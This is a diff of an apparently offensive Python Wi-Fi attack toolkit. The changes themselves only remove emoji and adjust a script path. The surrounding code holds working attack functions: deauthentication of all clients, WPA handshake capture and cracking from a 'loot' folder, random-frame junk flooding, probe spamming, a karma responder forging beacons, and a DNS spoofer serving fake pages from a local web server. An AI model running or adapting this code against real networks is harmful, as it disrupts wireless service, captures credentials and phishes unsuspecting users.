@@ -66,7 +66,7 @@ def packet_handler(pkt):
         if bssid not in seen_aps:
             seen_aps[bssid] = ssid
             scan_results[bssid] = {"ssid": ssid, "clients": []}
-            print(f"📶 AP: {ssid:<25} BSSID: {bssid}")
+            print(f" AP: {ssid:<25} BSSID: {bssid}")
     if pkt.haslayer(Dot11) and pkt.type == 2:
         src = pkt.addr2
         bssid = pkt.addr3
@@ -76,16 +76,16 @@ def packet_handler(pkt):
             print(f"    💡 Client: {src} -> {seen_aps[bssid]}")
 
 def scan_clients():
-    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     if not iface:
-        print("⚠️ Interface not entered.")
+        print(" Interface not entered.")
         return
-    print("📡 Scanning for clients and APs... (CTRL+C to stop)\n")
+    print(" Scanning for clients and APs... (CTRL+C to stop)\n")
     Thread(target=channel_hopper, args=(iface,), daemon=True).start()
     try:
         sniff(iface=iface, prn=packet_handler, store=0)
     except KeyboardInterrupt:
-        print("✅ Scan stopped.")
+        print(" Scan stopped.")
 
 def capture_handshake(iface, bssid):
     path = f"loot/handshake_{bssid.replace(':','')}.pcap"
@@ -123,7 +123,7 @@ def deauth_attack():
 def deauth_all():
     iface = input(" Monitor mode interface: ").strip()
     if not scan_results:
-        print("⚠️ Run scan first!")
+        print(" Run scan first!")
         return
     count = int(input(" Number of packets per client (default 100): ") or 100)
     delay = float(input(" Delay between packets (default 0.05): ") or 0.05)
@@ -147,7 +147,7 @@ def crack_handshakes():
     loot_dir = "loot"
     pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
     if not pcaps:
-        print("⚠️ No .pcap handshake files found in loot/")
+        print(" No .pcap handshake files found in loot/")
         return
 
     print("\n Available Handshakes:")
@@ -189,7 +189,7 @@ def probe_spammer(iface=None):
 def junk_flood(iface=None):
     if iface is None:
         iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
-    print("💣 Sending junk packets...")
+    print(" Sending junk packets...")
     while True:
         pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
         sendp(pkt, iface=iface, verbose=0)
@@ -204,14 +204,14 @@ def karma_responder(iface=None):
             resp = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
                 addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID=0, info=ssid)
             sendp(resp, iface=iface, verbose=0)
-            print(f"✨ Responded to probe for: {ssid}")
+            print(f" Responded to probe for: {ssid}")
     sniff(iface=iface, prn=handle)
 
 def chaos_mode():
     print(" Chaos Mode Engaged!")
     iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     if not iface:
-        print("⚠ Interface not entered.")
+        print(" Interface not entered.")
         return
     Thread(target=probe_spammer, args=(iface,), daemon=True).start()
     Thread(target=junk_flood, args=(iface,), daemon=True).start()
@@ -404,10 +404,10 @@ setTimeout(() => {{
 
     subprocess.run(["sudo", "pkill", "-f", "dnsmasq"])
     subprocess.run(["sudo", "pkill", "-f", "jamfi_dns_spoofer.py"])
-    time.sleep(1)  # give the port a sec to clear
+    time.sleep(1)  
 
     print("Starting Python DNS spoofer...")
-    subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])
+    subprocess.Popen(["python3", "../jamfi_dns_spoofer.py"])
 
     class HIDHandler(BaseHTTPRequestHandler):
         def do_GET(self):
@@ -452,7 +452,7 @@ setTimeout(() => {{
         def log_message(self, format, *args):
             return
 
-    print("💻 Serving fake pages on http://10.0.0.1 ...")
+    print(" Serving fake pages on http://10.0.0.1 ...")
     try:
         HTTPServer(("0.0.0.0", 80), HIDHandler).serve_forever()
     except KeyboardInterrupt:
